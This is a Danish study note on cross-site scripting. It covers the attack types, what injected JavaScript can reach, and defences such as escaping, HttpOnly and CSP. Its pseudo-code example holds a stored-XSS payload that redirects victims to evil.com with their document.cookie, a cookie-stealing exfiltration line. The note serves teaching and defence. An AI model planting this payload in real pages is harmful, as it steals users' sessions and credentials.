[XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
[XSS Vulnerabilities Scanner](https://www.acunetix.com/demo/)
[OWASP Java Encoder filter](https://owasp.org/www-project-java-encoder/)


XSS er et client side kode injektions angreb. Målet er at kode slem kode i brugerens webbrowser igennem den oprindelige og godsindede hjemmeside eller applikation.

En webside eller applikation er sårbar over for XSS hvis brugernes input ikke bliver tjekket inden det bliver sendt videre som output til en anden bruger.

Det kunne f.eks være et JavaScript, da de fleste browsere køre det. Med det ville man kunne skaffe adgang til brugerens maskine eller endda ændre indholdet på siden, til ondsindede links f.eks.
- Med JS vil man også kunne få adgang til brugerens session cookies, hvor der som regel ligger mange oplysninger, adgangskode, brugernavne osv.
- Det er også muligt at sende HTTP request's igennem XMLHttpRequest.
- Igennem HTML5 API'er er det også muligt at skaffe adgang til filsystemet, webcam, geoloc. Dette kræver tilladelse fra brugeren, men man læser jo aldrig hvad man siger ja til alligevel...

### 3 typer af angreb:
- **Reflected Cross-Site Scripting**
	- Angriber gemmer et ondt script på/i en URL og snyder brugeren til at aktivere det ved at klikke på et link f.eks.
	- I og med det er gemt, vil brugeren stadig få vist det indhold de forventer, og derved ikke ane uråd.
- **Stored Cross-Site Scripting**
	- Her bliver det onde kode injected til en web app der så gemmer det i en database eller server. Dette bliver aktiveret når brugeren åbner siden. Det kan altså ligge i vente position til hver gang at siden åbnes. Kaldes også **Persistent Cross-Site Scripting**
- **DOM-Based Cross-Site Scripting**
	- Her foregår alt kun i brugerens browser ved at manipulere **Document Object Model** fra JavaScript.
	- Disse er svære at opdage da de kun eksisterer i brugerens browser.

### Eksempel med pseudo kode:

```
print "<html>"
print "<h1>Most recent comment</h1>"
print database.LatestComment
print "<html>"

// Her printes den seneste kommentar fra et forum uden noget tjek.
// Har man lyst ville man kunne lave følgende kommentar:

<script> 
	window.location="http://evil.com/?cookie=" + document.cookie 
</script>

// Når serveren så bliver bedt om at vise den kommentar, ville 
// websiden eller appen bare printe scriptet og derved køre det 
// onde script. I dette tilfælde, finde brugerens cookies og stjæle dem.
```

![[Pasted image 20251109114804.png]]

### Undgå XSS angreb:
1. Uddan personer der arbejder med siden i de forskellige punkter.
2. Regn med at al user input er forkert eller farligt. Verificer at der er intet skadeligt inden det når server eller database.
3. Sørg for at brugernes indhold ikke vil kunne bliver tolket som html markup. Uden escaping ville dette: <script>alert("XSS")</script> bare køre som et script, Med escaping vil det se sådan her ud: &lt;script&gt;alert("XSS")&lt;/script&gt;. Altså special tegnene bliver udskiftet.
4. Skulle det være nødvendigt at brugerne kan inputte html, skal det saniteres og tjekkes. Brug et bibliotek til dette.
5. HttpOnly flag. Brug dette til at markere cookies til ikke at være tilgængelige via clientside JS.
6. Brug en **Content Security Policy(CSP)** CSP er en HTTP response header der lader en bestemme hvilke dynamiske ressourcer der må hentes dynamisk.
7. Brug et scannings værktøj til jævnligt at tjekke.

